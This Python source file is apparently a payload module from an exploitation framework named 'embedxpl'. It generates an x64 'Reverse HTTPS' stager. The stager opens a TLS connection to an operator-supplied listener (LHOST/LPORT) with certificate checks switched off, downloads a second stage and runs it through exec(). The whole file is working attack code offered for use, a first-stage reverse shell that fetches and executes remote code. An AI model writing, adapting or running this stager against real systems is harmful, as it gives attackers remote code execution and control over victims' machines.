"""x64 Reverse HTTPS Shell — Python stager TLS."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "x64 Reverse HTTPS",
        "description": "x64 TLS reverse shell stager — downloads and exec stage2 over HTTPS.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }
    options = {
        "LHOST": {"description": "HTTPS listener", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "HTTPS port", "required": True, "default": "443", "value": "443"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        stager = f"""import ssl,socket,subprocess,os
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
with socket.create_connection(('{lhost}',{lport})) as r:
    with ctx.wrap_socket(r) as s:
        d=b''
        while True:
            c=s.recv(4096)
            if not c:break
            d+=c
        exec(compile(d,'<s>','exec'))
"""
        return stager.encode()
